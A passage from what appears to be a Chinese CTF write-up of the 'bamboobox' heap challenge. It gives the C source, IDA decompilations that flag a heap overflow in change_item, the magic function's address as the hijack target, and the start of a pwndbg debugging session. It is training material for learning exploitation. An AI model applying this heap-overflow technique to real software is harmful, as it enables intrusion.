length);<br>      *(itemlist[index].name + readsize) = <span class="hljs-string">'\x00'</span>;<br>    } <span class="hljs-keyword">else</span> {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>}<br><span class="hljs-type">void</span> <span class="hljs-title function_">remove_item</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">char</span> indexbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> index;<br><br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, indexbuf, <span class="hljs-number">8</span>);<br>    index = atoi(indexbuf);<br>    <span class="hljs-keyword">if</span> (itemlist[index].name) {<br>      <span class="hljs-built_in">free</span>(itemlist[index].name);<br>      itemlist[index].name = <span class="hljs-number">0</span>;<br>      itemlist[index].size = <span class="hljs-number">0</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"remove successful!!"</span>);<br>      num--;<br>    } <span class="hljs-keyword">else</span> {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">magic</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> fd;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br>  fd = open(<span class="hljs-string">"./flag"</span>, O_RDONLY);<br>  read(fd, buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>  close(fd);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, buffer);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>}<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> choicebuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> choice;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">box</span> *<span class="hljs-title">bamboo</span>;</span><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  bamboo = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> box));<br>  bamboo-&gt;hello_message = hello_message;<br>  bamboo-&gt;goodbye_message = goodbye_message;<br>  bamboo-&gt;hello_message();<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br>    menu();<br>    read(<span class="hljs-number">0</span>, choicebuf, <span class="hljs-number">8</span>);<br>    choice = atoi(choicebuf);<br>    <span class="hljs-keyword">switch</span> (choice) {<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      show_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      add_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      change_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      remove_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>      bamboo-&gt;goodbye_message();<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild choice!!!"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a><strong>IDA静态分析</strong></h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  <span class="hljs-type">void</span> (**v4)(<span class="hljs-type">void</span>); <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  v4 = (<span class="hljs-type">void</span> (**)(<span class="hljs-type">void</span>))<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);<br>  *v4 = (<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))hello_message;<br>  v4[<span class="hljs-number">1</span>] = (<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))goodbye_message;<br>  (*v4)();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    <span class="hljs-keyword">switch</span> ( atoi(buf) )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        show_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        add_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        change_item(buf, buf);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        remove_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        v4[<span class="hljs-number">1</span>]();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild choice!!!"</span>);<br>        <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>​main函数其实没有什么好说的，但是值得注意的是程序开头就申请了一片堆空间来存放hello_message和goodbye_message，并在程序开始的时候调用hello_message和在程序结束的时候调用goodbye_message。</p><h3 id="meau函数"><a href="#meau函数" class="headerlink" title="meau函数"></a>meau函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bamboobox Menu"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1.show the items in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2.add a new item"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3.change the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4.remove the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5.exit"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice:"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>这是一个程序的菜单函数，没有什么特别的。</p><h3 id="show-item"><a href="#show-item" class="headerlink" title="show-item"></a>show_item</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">show_item</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">if</span> ( !num )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">99</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( itemlist[i].content )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d : %s"</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i, itemlist[i].content);<span class="hljs-comment">//老老实实打印堆块的内容</span><br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(byte_401089);<br>}<br></code></pre></td></tr></tbody></table></figure><p>首先判断存放于bss段的全局变量num是否有数据，然后进入循环打印程序各个结构体的内容，没有什么好看的。</p><h3 id="add-item"><a href="#add-item" class="headerlink" title="add-item"></a>add_item</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">add_item</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">99</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"the box is full"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    v2 = atoi(buf);<span class="hljs-comment">//输入准备输入内容的长度</span><br>    <span class="hljs-keyword">if</span> ( !v2 )<br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild length"</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    }<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">99</span>; ++i )<br>    {<br>      <span class="hljs-keyword">if</span> ( !itemlist[i].content )<br>      {<br>        LODWORD(itemlist[i].size) = v2;<br>        itemlist[i].content = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(v2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the name of item:"</span>);<br>        itemlist[i].content[(<span class="hljs-type">int</span>)read(<span class="hljs-number">0</span>, itemlist[i].content, v2)] = <span class="hljs-number">0</span>;<br>        ++num;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      }<span class="hljs-comment">//根据输入的长度，malloc大小，并填充数据</span><br>    }<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>首先根据num判断是否堆满了，然后根据堆结构体写入数据</p><p>根据输入的长度，生成一个堆，然后填入数据，不存在溢出</p><h3 id="change-item"><a href="#change-item" class="headerlink" title="change-item"></a>change_item</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">change_item</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">char</span> nptr[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( num )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    v1 = atoi(buf);<br>    <span class="hljs-keyword">if</span> ( itemlist[v1].content )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>      read(<span class="hljs-number">0</span>, nptr, <span class="hljs-number">8uLL</span>);<br>      v2 = atoi(nptr);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the new name of the item:"</span>);<br>      itemlist[v1].content[(<span class="hljs-type">int</span>)read(<span class="hljs-number">0</span>, itemlist[v1].content, v2)] = <span class="hljs-number">0</span>;<span class="hljs-comment">// //存在堆溢出，输出长度由我们自己决定</span><br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;<br>}<br></code></pre></td></tr></tbody></table></figure><p>又可以往堆中写入内容，这次长度由我们自己决定，存在堆溢出！！！</p><h3 id="remove-item"><a href="#remove-item" class="headerlink" title="remove-item"></a>remove_item</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">remove_item</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( num )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    v1 = atoi(buf);<br>    <span class="hljs-keyword">if</span> ( itemlist[v1].content )<br>    {<br>      <span class="hljs-built_in">free</span>(itemlist[v1].content);<br>      itemlist[v1].content = <span class="hljs-number">0LL</span>;<br>      LODWORD(itemlist[v1].size) = <span class="hljs-number">0</span>;           <span class="hljs-comment">// free了且将指针置0，不存在UAF</span><br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"remove successful!!"</span>);<br>      --num;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>}<br></code></pre></td></tr></tbody></table></figure><p>free(itemlist[v1].content);free(itemlist[index].name);<br>itemlist[v1].content = 0LL; -&gt;    itemlist[index].name = 0;<br>LODWORD(itemlist[v1].size) = 0;itemlist[index].size = 0;</p><p>free 了 堆块，清空指针，不存在uaf</p><h3 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">magic</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+Ch] [rbp-74h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">104</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  fd = open(<span class="hljs-string">"./flag"</span>, <span class="hljs-number">0</span>);<br>  read(fd, buf, <span class="hljs-number">0x64</span>uLL);<br>  close(fd);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, buf);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>magic = 0x400D49</p><p>目标地址，控制程序执行流到magic函数的位置即可get flag</p><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">00000000</span> item            struc ; (<span class="hljs-keyword">sizeof</span>=<span class="hljs-number">0x10</span>, mappedto_6)<br><span class="hljs-number">00000000</span>                                         ; XREF: .bss:itemlist/r<br><span class="hljs-number">00000000</span> size            dq ?<br><span class="hljs-number">00000008</span> content         dq ?                    ; offset<br><span class="hljs-number">00000010</span> item            ends<br><span class="hljs-number">00000010</span><br></code></pre></td></tr></tbody></table></figure><p>对应c代码的 item 结构体</p><h2 id="pwndbg-动态调试"><a href="#pwndbg-动态调试" class="headerlink" title="pwndbg-动态调试"></a>pwndbg 动态调试</h2><h3 id="堆内存分布"><a href="#堆内存分布" class="headerlink" title="堆内存分布"></a>堆内存分布</h3><p>首先使用gdb动态调试程序，创建两个堆块，然后进入调试模式，详细信息如下面的代码框所示：</p><ul><li>chunk0:size=10，content=“aaaaa”</li><li>chunk1:size=20，content=“bbbbb”</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c">giantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontrani<br>ng_lab11$ gdb bamboobox<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 175 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from bamboobox...<span class="hljs-params">(no debugging symbols found)</span>...done.<br>pwndbg&gt; r<br>Starting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox <br>There is a box with magic<br>what <span class="hljs-keyword">do</span> you want to <span class="hljs-keyword">do</span> in the box<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:2<br>Please enter the length of item name:10<br>Please enter the name of item:aaaaa<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:2<br>Please enter the length of item name:20<br>Please enter the name of item:bbbbb<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:^C<br>Program received signal SIGINT, Interrupt.<br>0x00007ffff7b04360 in __<span class="hljs-title function_">read_nocancel</span> <span class="hljs-params">()</span> at ../sysdeps/unix/syscall-template.S:84<br>84../sysdeps/unix/syscall-template.S: No such file or directory.<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────<br> RAX  0xfffffffffffffe00<br> RBX  0x0<br> RCX  0<span class="hljs-title function_">x7ffff7b04360</span> <span class="hljs-params">(__read_nocancel+<span class="hljs-number">7</span>)</span> ◂— cmp    rax, -0xfff<br> RDX  0x8<br> RDI  0x0<br> RSI  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0<br> R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700<br> R9   0xc<br> R10  0x0<br> R11  0x246<br> R12  0<span class="hljs-title function_">x4007a0</span> <span class="hljs-params">(_start)</span> ◂— xor    ebp, ebp<br> R13  0x7fffffffdd30 ◂— 0x1<br> R14  0x0<br> R15  0x0<br> RBP  0x7fffffffdc50 —▸ 0<span class="hljs-title function_">x400ee0</span> <span class="hljs-params">(__libc_csu_init)</span> ◂— push   r15<br> RSP  0x7fffffffdc28 —▸ 0<span class="hljs-title function_">x400e5d</span> <span class="hljs-params">(main+<span class="hljs-number">166</span>)</span> ◂— lea    rax, [rbp - 0x10]<br> RIP  0<span class="hljs-title 